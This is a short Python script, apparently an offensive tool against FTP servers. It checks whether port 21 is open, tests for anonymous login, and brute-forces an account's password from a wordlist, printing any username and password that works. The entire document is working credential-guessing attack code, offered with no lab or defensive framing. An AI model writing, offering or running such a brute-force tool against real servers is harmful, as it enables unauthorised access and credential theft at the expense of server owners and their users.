#!/usr/bin/python3
from ftplib import FTP
import socket

def Anon_login(target):
    print("[*] Trying anonymous login...")
    try:
        ftp = FTP(target)
        ftp.login()
        ftp.quit()
        print("[+] Server has accepted anonymous login!")
    except:
        print("[-] Server does not accept anonymous login")

def Port_21(check):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = s.connect_ex((check, 21))
    if port == 0:
        s.close()
        print("[+] Port 21 is open")
    else:
        s.close()
        print("[-] Port 21 is not open")

def Brute_force(target, username, wordlist):
    with open(wordlist, "r") as wordlist:
        word = wordlist.readline().strip()
        while word:
            Login_ftp(target, username, word)
            word = wordlist.readline().strip()

def Login_ftp(target, username, word):
    print("[*] Brute force is trying the password: " + word)
    ftp_session = FTP(target)
    try:
        ftp_session.login(username, word)
        ftp_session.quit()
        print("[+] Brute force is finished")
        print("[+] Username: " + username)
        print("[+] Password: " + word)
    except:
        ftp_session.quit()
        print("[-] Password failed")
